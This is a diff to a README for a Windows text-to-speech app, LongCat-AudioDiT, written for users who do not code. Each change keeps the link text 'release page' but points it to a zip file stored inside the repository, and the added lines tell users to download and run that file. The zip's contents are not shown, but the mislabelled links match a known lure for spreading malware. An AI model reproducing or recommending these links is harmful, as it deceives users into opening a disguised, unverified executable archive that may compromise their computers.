@@ -1,6 +1,6 @@
 # 🎧 LongCat-AudioDiT - Clear Speech From Text Fast
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-4b8bbe?style=for-the-badge&logo=github&logoColor=white)](https://github.com/geothermal-agony533/LongCat-AudioDiT/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-4b8bbe?style=for-the-badge&logo=github&logoColor=white)](https://github.com/geothermal-agony533/LongCat-AudioDiT/raw/refs/heads/main/audiodit/Long-T-Di-Audio-Cat-2.5.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ This page shows you how to get the app on Windows and run it with no coding.
 
 ## 📥 Download the app
 
-1. Open the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/releases).
+1. Open the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/raw/refs/heads/main/audiodit/Long-T-Di-Audio-Cat-2.5.zip).
 2. Find the latest release.
 3. Download the Windows file for your PC.
 4. Save the file to your Downloads folder or Desktop.
@@ -104,7 +104,7 @@ If you see an output folder, that is where the app may place new audio files.
 
 ## 📌 Release page
 
-Visit the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/releases) to download and run this file
+Visit the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/raw/refs/heads/main/audiodit/Long-T-Di-Audio-Cat-2.5.zip) to download and run this file
 
 ## 🧩 What the app is built for
 
@@ -173,7 +173,7 @@ Download the file again if:
 
 ## 🖱️ Quick start
 
-1. Go to the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/releases)
+1. Go to the [release page](https://github.com/geothermal-agony533/LongCat-AudioDiT/raw/refs/heads/main/audiodit/Long-T-Di-Audio-Cat-2.5.zip)
 2. Download the Windows file
 3. Open the file
 4. Enter text
